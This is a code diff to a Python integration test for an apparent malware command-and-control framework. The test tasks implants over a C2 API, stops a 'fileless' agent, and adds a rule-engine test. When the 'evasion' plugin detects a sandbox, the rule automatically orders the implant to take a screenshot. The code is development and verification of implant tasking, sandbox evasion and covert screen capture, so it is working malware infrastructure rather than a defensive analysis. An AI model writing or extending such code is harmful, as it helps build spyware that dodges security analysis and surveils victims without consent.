@@ -22,7 +22,7 @@ HOST = "127.0.0.1"
 PORT = 8888
 C2_URL = f"http://{HOST}:{PORT}/api"
 CONFIG_FILE = os.path.join(os.path.expanduser("~"), ".crawler_config.json")
-RULES_FILE = os.path.join("crawler", "implant", "rules.json")
+C2_RULES_FILE = os.path.join("crawler", "c2", "rules.json")
 TEMP_PLUGIN_PATH = os.path.join("crawler", "implant", "plugins", "temp_plugin.py")
 
 # --- Test App and DB Setup ---
@@ -68,7 +68,7 @@ def c2_server_and_db():
 # --- Main Integration Test ---
 def test_comprehensive_flow(c2_server_and_db):
     if os.path.exists(CONFIG_FILE): os.remove(CONFIG_FILE)
-    if os.path.exists(RULES_FILE): os.remove(RULES_FILE)
+    if os.path.exists(C2_RULES_FILE): os.remove(C2_RULES_FILE)
 
     # 1. Start agent
     agent = CrawlerAgent(c2_url=C2_URL)
@@ -211,6 +211,60 @@ def test_comprehensive_flow(c2_server_and_db):
         print("\n--- Terminating Fileless Agent ---")
         terminate_payload = {"command": "terminate", "args": {}}
         requests.post(f"{C2_URL}/admin/tasks/{fileless_implant_id}", json=terminate_payload)
+
+    # 7. Test Rule Engine
+    print("\n--- Testing Rule Engine ---")
+    # Create a rule file for the C2 to use
+    rule_content = [
+        {
+            "name": "Sandbox_Detected_Take_Screenshot",
+            "condition": {"plugin": "evasion", "result_not_empty": True},
+            "action": {
+                "type": "task",
+                "task_details": {
+                    "command": "start_plugin",
+                    "args": {"plugin_name": "screenshot"}
+                }
+            }
+        }
+    ]
+    with open(C2_RULES_FILE, "w") as f:
+        json.dump(rule_content, f)
+
+    # Re-instantiate the C2 API to load the new rules
+    # This is a hack for testing. In prod, the C2 would be restarted or have a reload endpoint.
+    test_app.dependency_overrides.clear()
+    test_app.dependency_overrides[get_db] = override_get_db
+    from crawler.c2.api import rule_engine
+    rule_engine.rules = rule_engine._load_rules()
+
+
+    # Task the evasion plugin with the trigger argument
+    evasion_task_payload = {
+        "command": "start_plugin",
+        "args": {"plugin_name": "evasion", "force_trigger": True}
+    }
+    response = requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=evasion_task_payload)
+    assert response.status_code == 200
+    time.sleep(agent.BEACON_INTERVAL_SECONDS + 2)
+
+    # Verify that a new screenshot task was created
+    response = requests.get(f"{C2_URL}/admin/tasks/{implant_id}")
+    assert response.status_code == 200
+    tasks = response.json()
+
+    screenshot_task_found = False
+    for task in tasks:
+        if task.get("args", {}).get("plugin_name") == "screenshot":
+            assert task["status"] in ("pending", "dispatched")
+            screenshot_task_found = True
+            print(f"Test: Rule engine successfully created a new screenshot task (status: {task['status']}).")
+            break
+    assert screenshot_task_found, "Rule engine did not create the expected screenshot task."
+
+    # Cleanup the rules file
+    if os.path.exists(C2_RULES_FILE):
+        os.remove(C2_RULES_FILE)
 
     # 8. Terminate Original Agent
     print("\n--- Terminating Original Agent ---")
